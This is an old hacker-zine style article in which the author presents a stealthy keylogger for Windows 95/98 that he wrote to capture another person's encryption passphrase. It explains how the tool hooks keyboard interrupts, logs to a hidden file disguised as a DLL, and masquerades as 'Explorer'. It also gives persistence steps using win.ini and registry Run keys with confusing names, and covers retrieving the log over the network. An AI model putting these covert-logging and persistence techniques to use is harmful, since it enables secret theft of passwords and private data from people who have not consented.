-------------------------[  A Stealthy Windows Keylogger


--------[  markj8@usa.net


    I recently felt the need to acquire some data being typed into Windows95
machines on a small TCP-IP network.  I had occasional physical access to the
machines and I knew the remote administration password, but the files were
being saved in BestCryptNP volumes, the passphrase for which I didn't know...

    I searched the Net as best I could for a suitable keylogging program that
would allow me to capture the passphrase without being noticed, but all I
could find was I big boggy thing written in visual basic that insisted on
opening a window.  I decided to write my own.  I wanted to write it as a VXD
because they run at Privilege Level 0 and can do just about ANYTHING.  I soon
gave up on this idea because I couldn't acquire the correct tools and certainly
couldn't afford to buy them.

    While browsing through the computer section of my local public library one
day I noticed a rather thin book called "WINDOWS ASSEMBLY LANGUAGE and SYSTEMS
PROGRAMMING" by Barry Kauler, (ISBN 0 13 020207 X) c 1993.  A quick flick
through the Table of Contents revealed "Chapter 10: Real-Time Events, Enhanced
Mode Hardware Interrupts".  I immediately borrowed the book and photocopied
it (Sorry about the royalties Barry).  As I read chapter 10 I realized that
all I needed was a small 16 bit Windows program running as a normal user
process to capture every keystroke typed into windows.  The only caveat was
that keystrokes typed into DOS boxes wouldn't be captured.  Big deal.  I could
live without that.  I was stunned to discover that all user programs in Windows
share a single Interrupt Descriptor Table (IDT).  This implies that if one
user program patches a vector in the IDT, then all other programs are
immediately affected.

    The only tool I had for generating windows executables was Borland C Ver
2.0 which makes small and cute windows 3.0 EXE's, so that's what I used.  I
have tested it on Windows for Workgroups 3.11, Windows 95 OSR2, and Windows 98
beta 3.  It will probably work on Windows 3.x as well.

    As supplied, it will create a hidden file in the \WINDOWS\SYSTEM directory
called POWERX.DLL and record all keystrokes into it using the same encoding
scheme as Doc Cypher's KEYTRAP3.COM program for DOS.  This means that you can
use the same conversion program, CONVERT3.C, to convert the raw scancodes in
the log file to readable ASCII.  I have included a slightly "improved" version
of CONVERT3.C with a couple of bugs fixed.  I contemplated incorporating the
functionality of CONVERT3 into W95Klog, but decided that logging scancodes
was "safer" that logging plain ASCII.  If the log file is larger that 2
megabytes when the program starts, it will be deleted and re-created with
length zero.  When you press CTRL-ALT-DEL (in windows95/98) to look at the
Task List, W95Klog will show up as "Explorer".  You can change this by editing
the .DEF file and recompiling, or by HEX Editing the .EXE file.  If anyone
knows how to stop a user program from showing on this list please tell me.

    To cause the target machine to run W95Klog every time it starts Windows
you can:

  1) Edit win.ini, [windows] section to say run=WHLPFFS.EXE or some such
confusing name :)   Warning!  This will cause a nasty error message if
WHLPFFS.EXE can't be found.  This method has the advantage of being able to be
performed over the network via "remote administration" without the need for
both computers to be running "remote registry service".

  2) Edit the registry key: (Win95/98)
`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run` and create
a new key called whatever you like with a string value of "WHLPFFS.EXE" or
whatever.  This is my preferred method because it is less likely to be stumbled
upon by the average user and windows continues without complaint if the
executable can't be found.  The log file can be retrieved via the network even
when it is still open for writing by the logging program.  This is very
convenient ;).
